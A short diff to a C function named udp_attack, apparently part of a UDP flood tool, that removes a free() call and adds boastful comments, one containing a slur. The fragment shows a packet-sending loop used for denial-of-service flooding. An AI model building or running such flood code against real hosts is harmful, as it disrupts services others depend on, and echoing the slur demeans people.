@@ -32,6 +32,9 @@ void* udp_attack(void* arg) {
     int packet_size = params->psize > 0 ? params->psize : 32;
     if (packet_size < min_packet_size) packet_size = min_packet_size;
     if (packet == NULL || last_packet_size != packet_size) {
+        // No need to free packet at the end.
+        // I did test.
+        // Incase anyone tries to note me >:(
         if (packet) free(packet);
         packet = malloc(packet_size);
         if (!packet) {
@@ -75,9 +78,8 @@ void* udp_attack(void* arg) {
         ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
         if (sent < 0) break;
     }
-    //free packet too
+    //free packet not needed
     // I accidently replaced wrong file cuz codespaces are g*y
-    free(packet);
     close(udp_sock);
     return NULL;
 }
